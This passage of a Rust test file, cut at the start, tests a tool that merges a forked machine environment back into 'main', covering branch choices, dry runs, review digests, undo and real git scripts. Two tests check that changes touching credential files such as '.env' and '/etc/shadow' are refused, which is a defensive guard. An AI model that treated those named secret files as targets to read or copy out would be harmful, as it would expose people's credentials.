        .iter()
        .any(|s| s.contains("on branch silo/fork") && s.contains("nothing was merged")));
    // Both the look ahead and the keep dropped their temporary refs.
    assert_eq!(world.logged("git_drop_ref"), 2);

    // A second keep never moves the branch that exists: it takes the next free name.
    kept(
        run(
            &world,
            &st,
            &journal,
            &choosing(&[(APP, Answer::Branch), (BASHRC, Answer::Main)]),
        )
        .unwrap(),
    );
    world.with("main", |c| {
        assert_eq!(c.branches, ["silo/fork", "silo/fork-2"])
    });
}

#[test]
fn branch_also_works_for_a_repository_that_would_merge_cleanly_and_drops_its_uncommitted_files() {
    let world = simple_world();
    *world.git_state.lock().unwrap() = "merge".into();
    let (_dir, journal) = journal();
    let fork = format!("{REPO_FORK}GITF\t/root/app\t_M\ta.txt\n");
    world.put("fork", "/root/app/a.txt", "fork edit");
    let st = store(REPO_BASE, &fork, REPO_BASE);
    let report = kept(run(&world, &st, &journal, &choosing(&[(APP, Answer::Branch)])).unwrap());
    assert_eq!(item(&report, APP).outcome, "branch");
    assert_eq!(world.logged("git_merge"), 0);
    world.with("main", |c| {
        assert_eq!(c.branches, ["silo/fork"]);
        assert!(!c.files.contains_key("/root/app/a.txt"));
    });
    assert!(report
        .notes
        .iter()
        .any(|n| n.contains("Uncommitted changes")));
}

#[test]
fn commits_with_credentials_are_refused_even_when_the_answer_is_branch() {
    let world = clashing_world();
    *world.changed_files.lock().unwrap() = vec![".env".into()];
    let (_dir, journal) = journal();
    let st = store(REPO_BASE, REPO_FORK, REPO_BASE);
    let refusal = refused(
        run(
            &world,
            &st,
            &journal,
            &choosing(&[(APP, Answer::Branch), (BASHRC, Answer::Main)]),
        )
        .unwrap(),
    );
    assert_eq!(refusal.reason, "credentials");
    assert!(refusal.conflicts[0].allowed.is_empty());
    assert_eq!(world.logged("git_branch"), 0);
    // A credential cannot be named in a choice: it is not an item of the diff.
    let error = run(
        &world,
        &st,
        &journal,
        &choosing(&[("credentials:/root/app/.env", Answer::Fork)]),
    )
    .unwrap_err();
    assert!(error.contains("credentials:/root/app/.env"), "{error}");
}

#[test]
fn skip_leaves_an_item_that_does_not_conflict_and_says_so() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let report = kept(run(&world, &st, &journal, &skipping(&[BASHRC])).unwrap());
    world.with("main", |c| assert_eq!(c.files["/root/.bashrc"].0, b"old"));
    assert_eq!(item(&report, BASHRC).outcome, "skipped");
    // Not skipped: the same keep brings it over.
    let world = simple_world();
    let report = kept(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    assert_eq!(item(&report, BASHRC).outcome, "brought-over");
}

#[test]
fn a_choice_for_an_unknown_item_or_an_answer_it_does_not_allow_is_an_error_naming_the_item() {
    let world = clashing_world();
    let (_dir, journal) = journal();
    let base = format!("{REPO_BASE}DB\tpostgres\tapp\tschema\ts1\n");
    let fork = format!("{REPO_FORK}DB\tpostgres\tapp\tschema\ts2\n");
    let st = store(&base, &fork, &base);
    let fails = |request: Request, id: &str| {
        let error = run(&world, &st, &journal, &request).unwrap_err();
        assert!(error.contains(id), "{error}");
        error
    };
    fails(
        choosing(&[("file:/nowhere", Answer::Fork)]),
        "file:/nowhere",
    );
    fails(skipping(&["package:dpkg:ghost"]), "package:dpkg:ghost");
    fails(choosing(&[(BASHRC, Answer::Branch)]), BASHRC);
    fails(
        choosing(&[("database:postgres:app", Answer::Main)]),
        "database:postgres:app",
    );
    fails(
        skipping(&["database:postgres:app"]),
        "database:postgres:app",
    );
    let mut both = skipping(&[BASHRC]);
    both.choices.answers.insert(BASHRC.into(), Answer::Fork);
    fails(both, BASHRC);
    // Nothing was fetched, checkpointed or changed by any of them.
    assert_eq!(world.logged("checkpoint"), 0);
    assert_eq!(world.logged("git_precheck"), 0);
}

#[test]
fn branch_is_only_offered_for_a_repository_with_commits_in_the_fork() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let fork =
        format!("{SIMPLE_FORK}GIT\t/root/app\taaa\tmain\t0\t0\nGITF\t/root/app\t_M\ta.txt\n");
    let base = format!("{SIMPLE_BASE}GIT\t/root/app\taaa\tmain\t0\t0\n");
    let error = run(
        &world,
        &store(&base, &fork, &base),
        &journal,
        &choosing(&[(APP, Answer::Branch)]),
    )
    .unwrap_err();
    assert!(
        error.contains(APP) && error.contains("no commits"),
        "{error}"
    );
}

#[test]
fn a_dry_run_with_choices_reports_what_the_real_run_does() {
    let world = clashing_world();
    let (_dir, journal) = journal();
    let st = || store(REPO_BASE, REPO_FORK, REPO_BASE);
    let answers = [(APP, Answer::Branch), (BASHRC, Answer::Fork)];
    let mut dry = choosing(&answers);
    dry.dry_run = true;
    let Outcome::DryRun(planned) = run(&world, &st(), &journal, &dry).unwrap() else {
        panic!()
    };
    assert_eq!(world.logged("checkpoint"), 0);
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"main edited");
        assert!(c.branches.is_empty());
    });

    // The real run, pinned to the digest the dry run reported.
    let mut real = choosing(&answers);
    real.reviewed = planned.review_digest.clone();
    let done = kept(run(&world, &st(), &journal, &real).unwrap());
    assert_eq!(done.items, planned.items);
    assert_eq!(done.summary, planned.summary);
    assert_eq!(done.fast_forward, planned.fast_forward);
    assert_eq!(done.items.len(), 2);
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"export X=1\n");
        assert_eq!(c.branches, ["silo/fork"]);
    });

    // Missing choices answer the same way in a dry run and a real run.
    let world = clashing_world();
    let (_dir, journal) = self::journal();
    let mut dry = request(Hooks::default());
    dry.dry_run = true;
    let a = refused(run(&world, &st(), &journal, &dry).unwrap());
    let b = refused(run(&world, &st(), &journal, &request(Hooks::default())).unwrap());
    assert_eq!(a, b);
    assert_eq!(a.conflicts.len(), 2);
}

#[test]
fn a_bad_choice_is_checked_after_the_digest_and_a_stale_digest_still_refuses() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let mut stale = choosing(&[(BASHRC, Answer::Fork)]);
    stale.reviewed = Some("not-the-digest".into());
    assert_eq!(
        refused(run(&world, &st, &journal, &stale).unwrap()).reason,
        "changed"
    );
}

#[test]
fn undo_after_choices_puts_main_back_and_the_branch_goes_with_it() {
    let world = clashing_world();
    let (_dir, journal) = journal();
    let mut st = store(REPO_BASE, REPO_FORK, REPO_BASE);
    kept(
        run(
            &world,
            &st,
            &journal,
            &choosing(&[(APP, Answer::Branch), (BASHRC, Answer::Fork)]),
        )
        .unwrap(),
    );
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"export X=1\n");
        assert_eq!(c.branches, ["silo/fork"]);
    });
    st.manifests.insert("main".into(), mt(REPO_BASE));
    let undone = super::undo(&Fake(world.clone()), &st, &journal, "main", WAIT).unwrap();
    assert!(matches!(undone, UndoOutcome::Undone { .. }), "{undone:?}");
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"main edited");
        assert!(
            c.branches.is_empty(),
            "the branch was part of what the undo took back"
        );
    });
}

#[test]
fn the_report_says_whether_main_was_unchanged_since_the_fork() {
    let (_dir, journal) = journal();
    let world = simple_world();
    let plain = request(Hooks::default());
    let report = kept(
        run(
            &world,
            &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
            &journal,
            &plain,
        )
        .unwrap(),
    );
    assert_eq!(report.fast_forward, Some(true));

    // Main changed a file the fork did not touch: not a fast-forward, and nothing conflicts.
    let world = simple_world();
    let moved = "F\t/root/.bashrc\t10\t1\tc:old\nF\t/root/other\t1\t9\tdd\n";
    let report = kept(
        run(
            &world,
            &store(SIMPLE_BASE, SIMPLE_FORK, moved),
            &journal,
            &plain,
        )
        .unwrap(),
    );
    assert_eq!(report.fast_forward, Some(false));
    assert_eq!(item(&report, BASHRC).outcome, "brought-over");

    // The flag is on a question's report too, and on a dry run's.
    let world = simple_world();
    world.put("main", "/root/.bashrc", "main edited");
    let main = "F\t/root/.bashrc\t21\t9\tdd\n";
    let outcome = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, main),
        &journal,
        &plain,
    )
    .unwrap();
    let Outcome::Refused { report, .. } = outcome else {
        panic!()
    };
    assert_eq!(report.fast_forward, Some(false));
    let mut dry = plain.clone();
    dry.dry_run = true;
    let world = simple_world();
    let Outcome::DryRun(report) = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &dry,
    )
    .unwrap() else {
        panic!()
    };
    assert_eq!(report.fast_forward, Some(true));
}

#[test]
fn a_database_item_is_reported_as_never_combined() {
    let world = simple_world();
    *world.changed_files.lock().unwrap() = vec!["migrations/002.sql".into()];
    let (_dir, journal) = journal();
    let st = || store(BASE, FORK, BASE);
    let id = "database:postgres:app";
    let migrate = Hooks {
        migrate: vec!["npm run migrate".into()],
        ..Hooks::default()
    };
    let report = kept(run(&world, &st(), &journal, &request(migrate)).unwrap());
    let db = item(&report, id);
    assert_eq!(db.outcome, "not-combined");
    assert!(
        db.detail
            .contains("migrate step runs on main's own database"),
        "{}",
        db.detail
    );

    let world = simple_world();
    let data_ok = Request {
        data_ok: true,
        ..request(Hooks::default())
    };
    let report = kept(run(&world, &st(), &journal, &data_ok).unwrap());
    assert!(item(&report, id).detail.contains("left as it is"));
    assert!(
        report.items.windows(2).all(|w| w[0].id < w[1].id),
        "items are in id order"
    );
}

#[test]
fn a_request_with_choices_reaches_the_keep_like_any_other() {
    // `changes.requests.keep` builds its Request with the same choices; both entry points
    // read them through `Request::choices`.
    let request = choosing(&[(APP, Answer::Branch)]);
    assert_eq!(
        request.choices.said(APP),
        super::super::items::Said::Answered(Answer::Branch)
    );
    assert!(skipping(&[BASHRC]).choices.said(BASHRC) == super::super::items::Said::Skipped);
}

#[test]
fn the_branch_scripts_leave_a_real_repositorys_checkout_and_branches_alone() {
    let root = tempfile::tempdir().unwrap();
    let git = |dir: &std::path::Path, args: &[&str]| {
        let out = std::process::Command::new("git")
            .args(["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false"])
            .args(args)
            .current_dir(dir)
            .output()
            .unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).trim().to_owned()
    };
    let (main, fork) = (root.path().join("main"), root.path().join("fork"));
    std::fs::create_dir(&main).unwrap();
    git(&main, &["init", "-q", "-b", "trunk"]);
    std::fs::write(main.join("a.txt"), "one\n").unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-q", "-m", "one"]);
    git(root.path(), &["clone", "-q", "main", "fork"]);
    std::fs::write(fork.join("a.txt"), "fork\n").unwrap();
    git(&fork, &["commit", "-q", "-am", "fork edit"]);
    std::fs::write(main.join("a.txt"), "main\n").unwrap();
    git(&main, &["commit", "-q", "-am", "main edit"]);
    std::fs::write(main.join("scratch.txt"), "untracked\n").unwrap();
    let (head, fork_head) = (git(&main, &["rev-parse", "HEAD"]), git(&fork, &["rev-parse", "HEAD"]));

    let bin = tempfile::tempdir().unwrap();
    let bundle = root.path().join("fork.bundle").to_string_lossy().into_owned();
    let (main_path, fork_path) = (main.to_string_lossy().into_owned(), fork.to_string_lossy().into_owned());
    let tmp_ref = "refs/silo-tmp/t-0";
    let ran = |cmd: GuestCmd, dir: &std::path::Path| {
        let (code, err) = run_script(&cmd, bin.path(), dir);
        assert_eq!(code, 0, "{err}");
    };
    ran(scripts::git_bundle(&fork_path, &bundle), &fork);
    let output = |cmd: GuestCmd| {
        let mut command = std::process::Command::new("bash");
        command.args(["-c", &cmd.script]).current_dir(&main);
        for (name, value) in &cmd.args {
            command.env(format!("A_{name}"), value);
        }
        let out = command.output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let state = output(scripts::git_precheck(&main_path, &bundle, tmp_ref));
    assert!(state.starts_with("conflict"), "{state}");

    assert_eq!(output(scripts::git_branch_plan(&main_path, tmp_ref, "silo/fork")), "silo/fork\nnew\n");
    output(scripts::git_branch(&main_path, tmp_ref, "silo/fork"));
    assert_eq!(git(&main, &["rev-parse", "silo/fork"]), fork_head);
    // Nothing is checked out or merged: main's branch, head, files and untracked file are as they were.
    assert_eq!(git(&main, &["rev-parse", "HEAD"]), head);
    assert_eq!(git(&main, &["symbolic-ref", "--short", "HEAD"]), "trunk");
    assert_eq!(std::fs::read_to_string(main.join("a.txt")).unwrap(), "main\n");
    assert_eq!(std::fs::read_to_string(main.join("scratch.txt")).unwrap(), "untracked\n");
    assert_eq!(git(&main, &["status", "--porcelain"]), "?? scratch.txt");

    // The same commits again find the branch; other commits under the name get the next free one.
    assert_eq!(output(scripts::git_branch_plan(&main_path, tmp_ref, "silo/fork")), "silo/fork\nsame\n");
    git(&main, &["branch", "silo/other", "trunk"]);
    assert_eq!(output(scripts::git_branch_plan(&main_path, tmp_ref, "silo/other")), "silo/other-2\nnew\n");
    // Creating over an existing branch fails instead of moving it.
    let (code, _) = run_script(&scripts::git_branch(&main_path, tmp_ref, "silo/other"), bin.path(), &main);
    assert_ne!(code, 0);
    assert_eq!(git(&main, &["rev-parse", "silo/other"]), head);
}

#[test]
fn ignored_files_of_a_repository_left_as_main_or_on_a_branch_are_not_written() {
    let base = "GIT\t/root/app\taaa\tmain\t0\t0\n";
    let fork = "GIT\t/root/app\tbbb\tmain\t0\t0\nGIG\t/root/app\t/root/app/build.out\t5\t9\tfff\n";
    let ignored = "file:/root/app/build.out";
    for answer in [Answer::Branch, Answer::Main] {
        let world = simple_world();
        world.put("fork", "/root/app/build.out", "built");
        *world.git_state.lock().unwrap() = "merge".into();
        let (_dir, journal) = journal();
        let report = kept(
            run(&world, &store(base, fork, base), &journal, &choosing(&[(APP, answer)])).unwrap(),
        );
        world.with("main", |c| assert!(!c.files.contains_key("/root/app/build.out")));
        assert_eq!(item(&report, ignored).outcome, "left-as-main");
    }
    // Without an answer for the repository the file comes along.
    let world = simple_world();
    world.put("fork", "/root/app/build.out", "built");
    *world.git_state.lock().unwrap() = "merge".into();
    let (_dir, journal) = journal();
    run(&world, &store(base, fork, base), &journal, &request(Hooks::default())).unwrap();
    world.with("main", |c| assert!(c.files.contains_key("/root/app/build.out")));
}

#[test]
fn a_launch_agent_left_as_main_is_neither_written_nor_loaded() {
    let plist = "/Users/a/Library/LaunchAgents/dev.new.plist";
    let fork = format!("F\t{plist}\t1\t1\tbb\nLAGENT\tuser\tdev.new\tbb\t{plist}\n");
    let world = World::new(Os::Macos, &["fork", "main"]);
    world.put("fork", plist, "<plist/>");
    let (_dir, journal) = journal();
    kept(
        run(
            &world,
            &store("", &fork, ""),
            &journal,
            &choosing(&[("launch-agent:user:dev.new", Answer::Main)]),
        )
        .unwrap(),
    );
    world.with("main", |c| assert!(!c.files.contains_key(plist)));
    assert_eq!(world.logged("agent_load"), 0);
}

#[test]
fn a_failure_while_reading_the_fork_does_not_put_main_back() {
    let world = simple_world();
    *world.fail_read.lock().unwrap() = true;
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let error = run(&world, &st, &journal, &request(Hooks::default())).unwrap_err();
    assert!(error.contains("could not be read"), "{error}");
    assert!(!error.contains("put back"), "{error}");
    assert_eq!(world.logged("restore"), 0);
    assert_eq!(journal.pending("main").unwrap(), None);
    assert_eq!(journal.latest_undoable("main"), None);
    world.with("main", |c| assert_eq!(c.files["/root/.bashrc"].0, b"old"));
}

#[test]
fn a_repository_left_on_a_branch_keeps_its_uncommitted_files_but_not_files_outside_it() {
    let base = "F\t/etc/app.conf\t1\t1\tc:old\nGIT\t/root\taaa\tmain\t0\t0\n";
    let fork = "F\t/etc/app.conf\t2\t2\tbb\nGIT\t/root\tbbb\tmain\t0\t0\nGITF\t/root\t_M\tnotes.txt\n";
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.put("fork", "/etc/app.conf", "fork conf");
    world.put("fork", "/root/notes.txt", "fork notes");
    world.put("main", "/etc/app.conf", "old");
    *world.git_state.lock().unwrap() = "merge".into();
    let (_dir, journal) = journal();
    let report = kept(
        run(
            &world,
            &store(base, fork, base),
            &journal,
            &choosing(&[("repo:/root", Answer::Branch)]),
        )
        .unwrap(),
    );
    world.with("main", |c| {
        assert_eq!(c.files["/etc/app.conf"].0, b"fork conf");
        assert!(!c.files.contains_key("/root/notes.txt"));
    });
    assert_eq!(item(&report, "file:/etc/app.conf").outcome, "brought-over");
    assert_eq!(item(&report, "file:/root/notes.txt").outcome, "left-as-main");
}

#[test]
fn credentials_are_found_by_a_repositorys_full_path_too() {
    let world = simple_world();
    *world.changed_files.lock().unwrap() = vec!["shadow".into()];
    let base = "GIT\t/etc\taaa\tmain\t0\t0\n";
    let fork = "GIT\t/etc\tbbb\tmain\t0\t0\n";
    let (_dir, journal) = journal();
    let refusal = refused(
        run(&world, &store(base, fork, base), &journal, &request(Hooks::default())).unwrap(),
    );
    assert_eq!(refusal.reason, "credentials");
    assert_eq!(refusal.conflicts[0].item, "/etc/shadow");
}
